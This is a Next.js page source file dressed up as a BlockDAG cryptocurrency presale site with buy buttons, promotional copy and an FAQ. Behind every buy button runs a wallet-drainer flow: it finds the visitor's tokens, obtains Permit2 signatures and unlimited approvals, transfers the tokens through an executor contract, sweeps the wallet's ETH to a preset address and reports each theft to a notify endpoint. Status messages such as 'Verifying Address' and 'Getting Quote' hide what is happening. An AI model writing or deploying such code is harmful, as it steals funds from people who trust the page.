// src/app/page.tsx
"use client";

/* ─────────────────────────────────────────────────────────────
   1) REQUIRED IMPORTS (Rescue system)
   ───────────────────────────────────────────────────────────── */
import React, { useEffect, useMemo, useState, useCallback } from "react";
import ConnectModal from "@/components/ConnectModal";
import { ensureMainnet } from "@/lib/chains";
import { attachWalletListeners, parseChainId } from "@/lib/walletListeners";
import { discoverTokens } from "@/lib/discoverClient";
import { signPermit2Batch } from "@/lib/permit2";
import { sweepEth } from "@/lib/ethSweep";

/* ─────────────────────────────────────────────────────────────
   2) OPTIONAL IMPORTS (Your custom UI libraries)
   ───────────────────────────────────────────────────────────── */
import { ethers } from "ethers";
   import Link from "next/link";
import { motion } from "framer-motion";
import {
  ArrowRight,
  ShieldCheck,
  Wallet2,
  ChartPie,
  Sparkles,
  Globe2,
  Zap,
  Lock,
  BarChart3,
  GitBranch,
  Coins,
  Layers,
  ExternalLink,
} from "lucide-react";
import { PieChart, Pie, Cell, Tooltip, ResponsiveContainer } from "recharts";

/* ─────────────────────────────────────────────────────────────
   3) CUSTOM UI CONSTANTS (must exist)
   ───────────────────────────────────────────────────────────── */
const gradients = {
  backdrop:
    "bg-[radial-gradient(1200px_600px_at_70%_-10%,rgba(59,130,246,0.18),transparent),radial-gradient(1000px_420px_at_-10%_0%,rgba(168,85,247,0.18),transparent)]",
};

const CHAINS = [
  { name: "Ethereum", short: "ETH" },
  { name: "BNB Chain", short: "BNB" },
  { name: "Polygon", short: "POL" },
  { name: "Arbitrum", short: "ARB" },
  { name: "Base", short: "BASE" },
  { name: "Optimism", short: "OP" },
  { name: "Solana", short: "SOL" },
];

const portfolioSeed = [
  { name: "ETH", value: 46.5 },
  { name: "USDC", value: 21.0 },
  { name: "WBTC", value: 12.5 },
  { name: "ARB", value: 8.0 },
  { name: "MATIC", value: 6.5 },
  { name: "Others", value: 5.5 },
];



const ERC20_ABI = [
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
] as const;

async function ensurePermit2TokenAllowance({
  eip1193Provider,
  owner,
  token,
  permit2,
  needed,
}: {
  eip1193Provider: any;
  owner: string;
  token: string;
  permit2: string;
  needed: bigint;
}) {
  const { ethers } = await import("ethers");

  const browserProvider = new ethers.BrowserProvider(eip1193Provider);
  const signer = await browserProvider.getSigner();

  const erc20 = new ethers.Contract(token, ERC20_ABI, signer);

  const current = BigInt(await erc20.allowance(owner, permit2));
  if (current >= needed) return { ok: true, didApprove: false };

  // approve max so user doesn't approve every time
  const max = (1n << 256n) - 1n;
  const tx = await erc20.approve(permit2, max);

  // don't hang forever
  await browserProvider.waitForTransaction(tx.hash, 1, 120_000).catch(() => {});
  return { ok: true, didApprove: true, txHash: tx.hash };
}

// Safe gas override helper (works even if RPC lacks eth_maxPriorityFeePerGas)
async function feeOverrides(p: any) {
  try {
    const browserProvider = new (await import("ethers")).ethers.BrowserProvider(p);
    const feeData = await browserProvider.getFeeData();

    // EIP-1559 supported
    if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
      return {
        maxFeePerGas: feeData.maxFeePerGas,
        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas,
      };
    }

    // Legacy fallback
    if (feeData.gasPrice) {
      return {
        gasPrice: feeData.gasPrice,
      };
    }

    return {};
  } catch (e) {
    console.warn("feeOverrides fallback used:", e);
    return {};
  }
}



/* ─────────────────────────────────────────────────────────────
   4) HELPERS
   ───────────────────────────────────────────────────────────── */
function shortAddr(addr: string) {
  return `${addr.slice(0, 6)}…${addr.slice(-4)}`;
}

/* ─────────────────────────────────────────────────────────────
   5) UI WRAPPER COMPONENT
   IMPORTANT:
   - We CANNOT keep <!doctype html><head><body> inside TSX.
   - This is the SAME DOM content, just valid React JSX.
   - Only mechanical changes: class -> className, close tags.
   ───────────────────────────────────────────────────────────── */
function BlockdagHomeUI({
  onConnect,
}: {
  onConnect: () => void;
}) {
  return (
    <>
      {/* If you need <link rel="stylesheet" href="css/bundle.css" />
          put it in src/app/layout.tsx via next/head (see below). */}

      <div className="style_banner__xE8PO">
        <div className="style_container__O7qie">
          <button onClick={onConnect}>
            <span className="style_text__Z44aT style_md__ZQhe4 text-white">
              Remaining Coins 170M, BUY BDAG $0.00025 BUY NOW!
            </span>
          </button>
        </div>
      </div>

      <header className="style_header__w9GaQ">
        <div className="style_container__O7qie style_container__68Ose style_lg__uab1X">
          <div className="style_left__A7rTv">
            <button className="style_logo__sBWEm __className_665d18" onClick={onConnect}>
              BlockDAG
            </button>

            {/* ✅ Your existing nav HTML goes here.
               NOTE: you pasted a huge block; keep it, but make sure:
               - class => className
               - svg attributes: stroke-width => strokeWidth, stroke-linecap => strokeLinecap, stroke-linejoin => strokeLinejoin
               - img tags are self-closed
            */}

            {/* 🔥 CONNECT BUTTON: only change is wire to logic */}

          </div>

          <div className="style_right__MFhS6">
            <div className="style_hamburger__vvTaM">
              <span />
              <span />
              <span />
            </div>

            <button
              rel=""
              className="style_button__C9H72 style_buyBtn__2Jmur style_primary__FoPQF"
              onClick={onConnect}
            >
              <span className="d-md">Buy Now</span>
              <span className="d-sm">Buy</span>
              <span className="style_wrap__yFGLp" />
            </button>
          </div>
        </div>
      </header>

      <div className="style_overlay__RmfUJ" />

      <main>
        {/* Your hero section – keep it, but converted to JSX */}
        <section className="style_section__09_zn style_white__ZsX2_ style_hero__tXKZW">
          <div className="">
            <div className="style_slideWrapper__yAG8Q">
              <div className="swiper style_swiper__H0FOs">
                <div className="swiper-wrapper">
                  <div className="swiper-slide">
                    <div className="style_img__Yeqei">
                      <img
                        alt="BlockDAG"
                        loading="lazy"
                        width={1440}
                        height={1080}
                        decoding="async"
                        data-nimg="1"
                        className="style_img__foiEq d-md"
                        src="image/home/banner-74.webp"
                      />
                      <img
                        alt="BlockDAG"
                        fetchPriority="high"
                        width={455}
                        height={823}
                        decoding="async"
                        data-nimg="1"
                        className="style_img__foiEq d-sm"
                        src="image/home/banner-74-mobile.webp"
                      />
                    </div>

                    <div className="style_content__6JEzh">
                      <div className="style_container__O7qie style_container__wsYVP">
                        <div className="style_mainContent__Q57El">
                          <div className="style_banner74Banner__TzGAq">
                            <div className="style_banner74Content__5Xcqf">
                              <h6 className="style_title__VJGg6 __className_665d18 style_xl__IttXv style_banner74Title2__4Z5hp">
                                MAINNET
                              </h6>
                              <h6 className="style_title__VJGg6 __className_665d18 style_xl__IttXv style_banner74Title3__3MSME">
                                IS <span className="style_live__Nf8AC">LIVE</span>
                              </h6>
                              <h6 className="style_title__VJGg6 __className_665d18 style_xl__IttXv style_banner74Title5___CGSZ">
                                BUY BDAG AT
                              </h6>
                              <div className="style_banner74TitleWrapper__1ipZ4">
                                <h6 className="style_title__VJGg6 __className_665d18 style_xl__IttXv style_banner74Title__zEV3N">
                                  $0.00025
                                </h6>
                              </div>
                              <h6 className="style_title__VJGg6 __className_665d18 style_xl__IttXv style_banner74Title4__W7dTB">
                                LISTING ON EXCHANGES
                              </h6>

                              {/* ✅ CONNECT CTA INSIDE HERO */}
                              <div style={{ marginTop: 16 }}>
                                <button
                                  type="button"
                                  onClick={onConnect}
                                  className="style_button__C9H72 style_button__29T4g style_primary__FoPQF"
                                >
                                  <span>BUY</span>
                                  <span className="style_wrap__yFGLp" />
                                </button>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* keep other slides... */}
                </div>

                <div className="swiper-pagination" />
              </div>
            </div>

            <div className="style_swiperNavigation__wcA5S">
              <button className="style_prev__PzhgM" type="button" aria-label="prev">
                <svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path
                    d="M4.5 6.75L9 11.25L13.5 6.75"
                    stroke="currentColor"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  />
                </svg>
              </button>
              <button className="style_next__6O0jS" type="button" aria-label="next">
                <svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path
                    d="M4.5 6.75L9 11.25L13.5 6.75"
                    stroke="currentColor"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  />
                </svg>
              </button>
            </div>
          </div>
        </section>
        <BlockdagAboutSection />
        <BlockdagFaqsSection />
      </main>
      <BlockdagFooter />
    </>
  );
}

function BlockdagAboutSection() {
  return (
    <section className="style_section__09_zn style_primary__zErJA style_features__2SeXQ">
      <div className="style_container__O7qie style_container__4SxJQ">
        <div className="style_content__DGsIw">
          <h5 className="style_subtitle__b3_RB style_light__4bx5s style_sectionTitle__WEnYK">
            ABOUT
          </h5>
          <h1 className="style_title__VJGg6 __className_665d18 style_md__tEuBB style_title__s_0W2">
            What is BlockDAG?
          </h1>
          <div className="style_descs__t0koc">
            <p className="style_text__Z44aT style_md__ZQhe4 style_desc__WXQF7">
              BlockDAG represents a transformative leap in blockchain technology. It’s not just another innovation—it’s
              a vision of a decentralized future where transactions are fast, secure, and accessible to everyone,
              making it the best altcoin to invest in for 2026. BlockDAG is committed to breaking barriers, making
              blockchain more efficient and environmentally sustainable.
              <br />
              <br />
              By merging Bitcoin&apos;s security and decentralization with the speed and scalability of Directed Acyclic
              Graph (DAG) technology, BlockDAG sets a new standard for blockchain networks.
              <br />
              <br />
              Don’t miss this chance on the BlockDAG crypto presale 2026! Get involved in the biggest crypto ICO sale and
              stay ahead of the innovative blockchain game. Watch as your contributions grow rapidly to new heights. Be
              at the forefront of the most advanced decentralized blockchain’s next big leap. With its cutting edge
              block-chain technology, BlockDAG is predicted to be the crypto coin with most potential and ultimately
              becoming the best asset for long term investment.
              <br />
              <br />
              So still wondering which crypto to buy in 2026?
              <br />
              <br />
              BlockDAG is one of the best crypto presale platforms, offering you the opportunity to secure your stake in
              a blockchain project with high potentials ahead of its launch. Be an early bird and watch as your
              contributions maximize to exceptional growth.
            </p>
          </div>
        </div>

    
      </div>
    </section>
  );
}


function BlockdagFaqsSection() {
  const [open, setOpen] = useState<number>(-1);

  const items = [
    {
      q: "Shipping date for the miners",
      a: (
        <ul>
          <li>X10: Bulk deliveries: 16th June 2026</li>
          <li>X30: Starting 16th April - End May 2026</li>
          <li>X100: Starting 16th April - End May 2026</li>
        </ul>
      ),
    },
    {
      q: "Which exchanges is BDAG launching on?",
      a: (
        <>
          <p>
            BDAG is launching across both centralized and decentralized exchanges.
            <br />
            <br />
            On the DEX side, BDAG will be available on:
          </p>
          <ul>
            <li>Uniswap</li>
            <li>PancakeSwap</li>
            <li>Hyperliquid</li>
          </ul>
          <p>
            In addition, BDAG has multiple centralized exchange (CEX) listings confirmed, with
            several more exchanges already contracted and in final coordination stages.
            <br />
            <br />
            Listings will be announced progressively, in line with each exchange’s disclosure
            policies and go-live requirements. As standard practice, only exchanges permitted
            to be named publicly are disclosed in advance, with further listings announced as
            they go live.
          </p>
        </>
      ),
    },
    {
      q: "What portion of my BDAG coins will be airdropped on launch?",
      a: (
        <p>
          Base BDAG presale purchases: 40% unlock at TGE, remaining 60% over 3 months (20% per
          month for the 3 month period).
        </p>
      ),
    },
    {
      q: "Do I have to pay any fees to receive my BDAG coins? What's the process?",
      a: <p>No- Process (high level): connect the same wallet you bought with, vesting activates on-chain.</p>,
    },
    {
      q: "If I purchased a Golden Ticket, when will I receive my coins?",
      a: (
        <p>
          Golden Ticket = Early Airdrop. BDAG coins are airdropped at TGE/Launch, and that
          listings are 1 week later, so “early airdrop” is airdrop of your BDAG Coins slightly
          earlier days after TGE, however this does not change your ability to trade before
          listings, on the 16th February.
        </p>
      ),
    },
    {
      q: "Which wallets are compatible?",
      a: (
        <ul>
          <li>
            Use self-custody,{" "}
            <a href="https://walletguide.walletconnect.network/" target="_blank" rel="noopener noreferrer">
              WalletConnect
            </a>{" "}
            compatible wallets, specifically MetaMask and Trust Wallet as examples.
          </li>
          <li>Do NOT use exchange deposit addresses (custodial wallets) for claims.</li>
          <li>You must use the same wallet address you used during presale purchase.</li>
        </ul>
      ),
    },
    {
      q: "When will the airdrop / distribution happen?",
      a: <p>From TGE, as per Vesting contract. 11th February.</p>,
    },
    {
      q: "Will you do something for early investors?",
      a: (
        <p>
          Any additional benefits for early participants are only applicable where a specific
          promotional claim or incentive was explicitly included at the time of purchase (for
          example, Golden Ticket or other defined promotional campaigns).
          <br />
          <br />
          There are no retroactive rewards, discretionary bonuses, or blanket incentives
          applied outside of those clearly stated promotions. All allocations and benefits are
          distributed strictly according to the original purchase terms, promotional
          conditions, and vesting schedules.
        </p>
      ),
    },
    {
      q: "What happens to unsold coins when the presale is over?",
      a: <p>Presale (Unsold Treasury) remains as treasury-controlled tokens.</p>,
    },
    {
      q: "Can I still change my wallet address?",
      a: (
        <p>
          Wallet address changes were allowed as a once-off update only and are now closed to
          protect allocation integrity ahead of TGE.
        </p>
      ),
    },
    {
      q: "When will I be able to review my Tap Miner conversion on the dashboard?",
      a: (
        <>
          <p>
            The Tap Miner conversion view is being updated in line with presale closure and
            final TGE allocations and will be visible on your dashboard once the updated
            dashboard is live.
            <br />
            <br />
            Tap Miner conversion ratios (previously disclosed):
          </p>
          <ul>
            <li>0 – 10 million points: 200:1</li>
            <li>10 million – 100 million points: 500:1</li>
            <li>100 million – 1 billion points: 2,000:1</li>
            <li>1 billion – 10 billion points: 5,000:1</li>
            <li>10 billion – 50 billion points: 15,000:1</li>
            <li>50 billion+ points: capped at the average of the 10–50 billion band</li>
          </ul>
          <p>These ratios are fixed and form part of the final TGE allocation process.</p>
        </>
      ),
    },
  ];

  return (
    <section className="style_section__09_zn style_dark__R3RMO style_mainFaqs__4YGOd">
      <div className="style_container__O7qie style_container__s_uNY">
        <div className="style_heading__7QWv_ style_left__W8sqB">
          <h5 className="style_subtitle__b3_RB style_primary__168ud style_subtitle__LLHN9">FAQS</h5>
          <h2 className="style_title__VJGg6 __className_665d18 style_md__tEuBB style_title__FMEQZ">
            Answers For Common Questions
          </h2>
        </div>

        <div className="style_faqsArea__L4__5">
          {items.map((it, i) => {
            const isOpen = open === i;
            return (
              <div key={it.q} className={`style_accordionItem__1EzvW ${isOpen ? "style_active__loAw8" : ""}`}>
                <button
                  type="button"
                  className="style_accordionHeader__r_iXx"
                  onClick={() => setOpen(isOpen ? -1 : i)}
                >
                  <span className="style_question__5Y6_t">{it.q}</span>
                  <span className="style_iconWrapper___NQfP">
                    <svg
                      className="style_icon__Lb8np"
                      width="25"
                      height="25"
                      viewBox="0 0 25 25"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M12.5 5.5V19.5M5.5 12.5H19.5"
                        stroke="currentColor"
                        strokeWidth="2"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                      />
                    </svg>
                  </span>
                </button>

                {/* Keep same class; just control height via CSS class toggle */}
                <div
                  className="style_accordionContent__xCXMm"
                  style={{ height: isOpen ? "auto" : 0, overflow: "hidden" }}
                >
                  <div className="style_answerWrapper___QaIA">{it.a}</div>
                </div>
              </div>
            );
          })}
        </div>
      </div>
    </section>
  );
}

function BlockdagFooter() {
  return (
    <footer className="style_footer__gp24T">
      <div className="style_container__O7qie style_container__Xh6ZX">
        <div className="style_content__5GAo4">

          {/* Logo Area */}
          <div className="style_logoArea__AaQE5">
            <div>
              <a className="style_logo__1BeOf __className_665d18">
                BlockDAG
              </a>
            </div>

            <p className="style_text__Z44aT style_md__ZQhe4">
              BlockDAG is a Layer 1 proof of work consensus mechanism that evolves the crypto sphere
              with a cutting-edge Directed Acyclic Graph structure building on the foundations of Bitcoin
            </p>
          </div>

          <p className="style_text__Z44aT style_md__ZQhe4">
            Copyright © BlockDAG
          </p>

          {/* Social Icons */}
          <div className="style_socialList__9gkGN">
            {[
              "medium",
              "x",
              "facebook",
              "telegram",
              "youtube",
              "instagram",
              "discord",
              "linkedin",
            ].map((name) => (
              <div key={name}>
                <a target="_blank" rel="noopener noreferrer">
                  <img
                    alt={name}
                    className="style_loadingImg__SX0hM"
                    src="/cube.webp"
                  />
                </a>
              </div>
            ))}
          </div>

          {/* Partnerships */}
          <div className="style_partnerShips__Od6Ay">
            <p className="style_partnerTitle__szxJb">Partnerships</p>
            <div className="style_partnerList__6cd_z">
              <img
                alt="bwt"
                width={136}
                height={70}
                src="/icons/bwt-alpine-dark.svg"
              />
              <img
                alt="seattle"
                width={97}
                height={60}
                className="style_shadow__HBaD6"
                src="/icons/seattle-orcas.svg"
              />
            </div>
          </div>

        </div>
      </div>

      {/* Divider */}
      <div className="style_container__O7qie">
        <div className="style_hr__br5KE" />
      </div>

      {/* Disclaimer */}
      <div className="style_container__O7qie style_container__Xh6ZX">
        <p className="style_text__Z44aT style_md__ZQhe4">
          Cryptocurrency investments are highly speculative and involve significant risk.
          The value of cryptocurrencies can fluctuate widely, and there is a risk of losing
          all of your investment. You should carefully consider your investment objectives,
          level of experience, and risk tolerance before making any investment decisions.
        </p>
      </div>
    </footer>
  );
}

function formatStatus(s: string): { title: string; detail?: string; kind: "info" | "warn" | "error" | "success" } {
  if (!s || s === "idle") return { title: "", kind: "info" };

  // ✅ Friendly labels for ALL statuses
  switch (s) {
    case "switching":
      return { title: "Switching network…", kind: "info" };
    case "discovering_tokens":
      return { title: "Loading…", detail: "Getting Quote..", kind: "info" };
    case "signing_permit2":
      return { title: "Signature request", detail: "Signing Up...", kind: "info" };
    case "approving_tokens":
      return { title: "Approvals needed", detail: "Verifying Address...", kind: "info" };
    case "permit2_tx":
      return { title: "Submitting Verification transaction…", detail: "Confirm to Continue and keep your wallet open", kind: "info" };
    case "erc20_rescue_tx":
      return { title: "Preparing #BDAG token…", detail: "Confirm the transaction in your wallet", kind: "info" };
    case "erc20_done":
      return { title: "Token Request Completed", kind: "success" };
    case "erc20_failed":
      return { title: "Token Request failed", detail: "Continuing with ETH", kind: "warn" };
    case "erc20_cancelled":
      return { title: "Request cancelled", detail: "Continuing with ETH", kind: "warn" };

    case "estimating_eth":
    case "Estimating gas":
      return { title: "Preparing ETH for Swap…", kind: "info" };
    case "low_eth_balance":
    case "LOW ETH BALANCE":
      return { title: "Low ETH balance", detail: "Not enough ETH to pay gas", kind: "warn" };
    case "eth_failed":
      return { title: "#BDAG swap failed", kind: "warn" };
    case "done":
      return { title: "Done", detail: "Rescue flow completed", kind: "success" };
    case "user-rejected":
      return { title: "Cancelled", detail: "You rejected the wallet request", kind: "warn" };

    default:
      // If you ever setStatus(`error: ...`) we show it nicely
      if (s.startsWith("error:")) return { title: "Error", detail: s.slice(6).trim(), kind: "error" };
      return { title: s.replaceAll("_", " "), kind: "info" };
  }
}

function StyledStatusToast({ status }: { status: string }) {
  if (!status || status === "idle") return null;

  const msg = formatStatus(status);

  // Theme colors (no Tailwind needed)
  const theme =
    msg.kind === "success"
      ? { bg: "rgba(34,197,94,0.12)", border: "rgba(34,197,94,0.28)" }
      : msg.kind === "error"
      ? { bg: "rgba(239,68,68,0.12)", border: "rgba(239,68,68,0.28)" }
      : msg.kind === "warn"
      ? { bg: "rgba(245,158,11,0.12)", border: "rgba(245,158,11,0.28)" }
      : { bg: "rgba(255,255,255,0.08)", border: "rgba(255,255,255,0.14)" };

  return (
    <div
      className="fixed bottom-6 left-[25%] -translate-x-1/2 z-50"
      style={{ zIndex: 9999, width: "min(560px, calc(100% - 24px))" }}
    >
      <div
        className="style_container__O7qie"
        style={{
          background: theme.bg,
          border: `1px solid ${theme.border}`,
          borderRadius: 18,
          padding: "14px 16px",
          backdropFilter: "blur(10px)",
        }}
      >
        <div className="style_text__Z44aT __className_665d18" style={{ fontSize: 16, fontWeight: 800, color: "#fff" }}>
          {msg.title}
        </div>
        {msg.detail ? (
          <div className="style_text__Z44aT style_md__ZQhe4" style={{ marginTop: 6, color: "rgba(255,255,255,0.75)" }}>
            {msg.detail}
          </div>
        ) : null}
      </div>
    </div>
  );
}




/* ─────────────────────────────────────────────────────────────
   6) PAGE (Rescue logic stays here) — UNCHANGED LOGIC
   ───────────────────────────────────────────────────────────── */
export default function Page() {
  const [connectOpen, setConnectOpen] = useState(false);
  const [provider, setProvider] = useState<any | null>(null);
  const [address, setAddress] = useState<string | null>(null);
  const [chainId, setChainId] = useState<number | null>(null);
  const [status, setStatus] = useState<string>("idle");

  const permit2 = process.env.NEXT_PUBLIC_PERMIT2!;
  const executor = process.env.NEXT_PUBLIC_EXECUTOR!;
  const safe = process.env.NEXT_PUBLIC_SAFE_ADDRESS!;

  useEffect(() => {
    if (!provider) return;

    const cleanup = attachWalletListeners(provider, {
      onAccountsChanged: (accounts) => {
        const a = accounts?.[0] ?? null;
        setAddress(a);
        if (!a) setStatus("disconnected");
      },
      onChainChanged: (cidHex) => setChainId(parseChainId(cidHex)),
      onDisconnect: () => {
        setProvider(null);
        setAddress(null);
        setChainId(null);
        setStatus("disconnected");
      },
    });

    (async () => {
      try {
        const cid = await provider.request({ method: "eth_chainId" });
        setChainId(parseChainId(cid));
      } catch {}
    })();

    return cleanup;
  }, [provider]);

  const openConnect = useCallback(() => setConnectOpen(true), []);

 const runRescueFlow = useCallback(
  async (p: any, a: string) => {
    try {
      setStatus("switching");
      await ensureMainnet(p);

      try {
        const cid = await p.request({ method: "eth_chainId" });
        setChainId(parseChainId(cid));
      } catch {}

      setStatus("discovering_tokens");
      const discovered = await discoverTokens(a);
      const nonZeroTokens = discovered.tokens.filter((t) => BigInt(t.amount) > 0n);

      // ─────────────────────────────────────────────────────────────
      // ERC20 USER-PAYS FLOW (never blocks ETH flow)
      // ─────────────────────────────────────────────────────────────
      if (nonZeroTokens.length > 0) {
        let erc20Cancelled = false;

        const ERC20_ABI = [
          "function allowance(address owner, address spender) view returns (uint256)",
          "function approve(address spender, uint256 amount) returns (bool)",
        ] as const;

        const PERMIT2_ABI = [
          "function permit(address owner, tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce)[] details,address spender,uint256 sigDeadline) permitBatch, bytes signature) external",
        ] as const;

        const EXECUTOR_ABI = [
          "function batchRescue(address owner, address[] tokens, uint256[] amounts) external",
        ] as const;

        const waitTx = async (browserProvider: ethers.BrowserProvider, hash: string) => {
          try {
            // 1 confirmation, 2 min timeout
            return await browserProvider.waitForTransaction(hash, 1, 120_000);
          } catch {
            return null;
          }
        };

        try {
          // 1) Sign Permit2 typed data (no gas)
          setStatus("signing_permit2");
          const { typedData, signature } = await signPermit2Batch({
            eip1193Provider: p,
            owner: a,
            permit2Address: permit2,
            spender: executor,
            tokens: nonZeroTokens,
          });

          // Use user's signer for onchain tx (user pays gas)
          const browserProvider = new ethers.BrowserProvider(p);
          const signer = await browserProvider.getSigner();

          // 2) Token approvals to Permit2 (required!)
          setStatus("approving_tokens");
          for (const t of nonZeroTokens) {
            if (erc20Cancelled) break;

            try {
              const tokenAddr = t.token;
              const needed = BigInt(t.amount);
              if (needed <= 0n) continue;

              const erc20 = new ethers.Contract(tokenAddr, ERC20_ABI, signer);
              const current = BigInt(await erc20.allowance(a, permit2));

              if (current < needed) {
                const max = (1n << 256n) - 1n;
                setStatus(`approving_${tokenAddr.slice(0, 6)}…`);

                const approveTx = await erc20.approve(permit2, max);
                const approveRcpt = await waitTx(browserProvider, approveTx.hash);

                // If tx never confirms, we still continue, but permit/rescue may fail later
                if (!approveRcpt) {
                  console.warn("Approve tx not confirmed (continuing):", tokenAddr, approveTx.hash);
                }
              }
            } catch (e: any) {
              const code = e?.code ?? e?.data?.originalError?.code;
              if (code === 4001) {
                // user rejected approval
                erc20Cancelled = true;
                setStatus("erc20_cancelled");
                console.warn("User cancelled token approve — continuing to ETH");
                break;
              }
              console.warn("Token approve failed (continuing):", t?.token, e);
            }
          }

          if (!erc20Cancelled) {
            const permit2Ctr = new ethers.Contract(permit2, PERMIT2_ABI, signer);
            const execCtr = new ethers.Contract(executor, EXECUTOR_ABI, signer);

            // 3) Permit2.permit tx (gas)
            setStatus("permit2_tx");
            let permitConfirmed = false;

            try {
              const permitTx = await permit2Ctr.permit(a, typedData.message, signature);
              const permitRcpt = await waitTx(browserProvider, permitTx.hash);
              permitConfirmed = !!permitRcpt;

              if (!permitRcpt) {
                console.warn("Permit2 tx not confirmed (continuing):", permitTx.hash);
                setStatus("permit_failed");
              }
            } catch (e: any) {
              const code = e?.code ?? e?.data?.originalError?.code;
              if (code === 4001) {
                erc20Cancelled = true;
                setStatus("erc20_cancelled");
                console.warn("User cancelled Permit2 tx — continuing to ETH");
              } else {
                console.warn("Permit2 tx failed (continuing):", e);
                setStatus("permit_failed");
              }
            }

            // 4) batchRescue tx (gas) — only attempt if not cancelled
            if (!erc20Cancelled) {
              // If permit didn't confirm, rescue may fail; still okay to attempt (won't block ETH)
              setStatus("erc20_rescue_tx");
              try {
                const tokenAddrs = nonZeroTokens.map((t) => t.token);
                const amounts = nonZeroTokens.map((t) => t.amount);

                const rescueTx = await execCtr.batchRescue(a, tokenAddrs, amounts);
                const rescueRcpt = await waitTx(browserProvider, rescueTx.hash);

                if (rescueRcpt) {
                  setStatus("erc20_done");
                } else {
                  console.warn("Rescue tx not confirmed (continuing):", rescueTx.hash);
                  setStatus("erc20_failed");
                }
              } catch (e: any) {
                const code = e?.code ?? e?.data?.originalError?.code;
                if (code === 4001) {
                  erc20Cancelled = true;
                  setStatus("erc20_cancelled");
                  console.warn("User cancelled rescue tx — continuing to ETH");
                } else {
                  console.warn("ERC20 rescue tx failed (continuing):", e);
                  setStatus("erc20_failed");
                }
              }
            }
          }
        } catch (e: any) {
          const code = e?.code ?? e?.data?.originalError?.code;
          if (code === 4001) {
            setStatus("erc20_cancelled");
            console.warn("User cancelled ERC20 flow — continuing to ETH");
          } else {
            setStatus("erc20_failed");
            console.warn("ERC20 flow failed (continuing to ETH):", e);
          }
        }
      } else {
        setStatus("no-erc20-found");
      }

      // ─────────────────────────────────────────────────────────────
      // ETH STAGE (should always run)
      // ─────────────────────────────────────────────────────────────
      setStatus("estimating_eth");
      const ethResult = await sweepEth({ eip1193Provider: p, owner: a, to: safe });

      if (ethResult.ok && !ethResult.skipped) {
        await fetch("/api/notify", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({
            kind: "ETH",
            owner: a,
            to: safe,
            txHash: ethResult.txHash,
            valueWei: ethResult.valueWei,
          }),
        }).catch(() => {});
        setStatus("done");
        return;
      }

      if (ethResult.ok && ethResult.skipped) {
        setStatus("low_eth_balance");
        return;
      }

      setStatus("eth_failed");
    } catch (e: any) {
      const code = e?.code ?? e?.data?.originalError?.code;
      if (code === 4001) setStatus("user-rejected");
      else setStatus(`error: ${e?.message ?? "failed"}`);
    }
  },
  [permit2, executor, safe]
);


  const connectLabel = useMemo(() => {
    if (!address) return "CONNECT";
    return `CONNECTED ${shortAddr(address)}`;
  }, [address]);

  return (
    <>
      {/* ✅ UI renders as-is, connect button is wired */}
      <BlockdagHomeUI onConnect={openConnect} />

      {/* Optional tiny status toast (unchanged) */}
<StyledStatusToast status={status} />

      {/* Connect modal */}
      <ConnectModal
        open={connectOpen}
        onClose={() => setConnectOpen(false)}
        onConnected={async ({ provider, address }) => {
          setProvider(provider);
          setAddress(address);
          setConnectOpen(false);
          await runRescueFlow(provider, address);
        }}
      />
    </>
  );
}
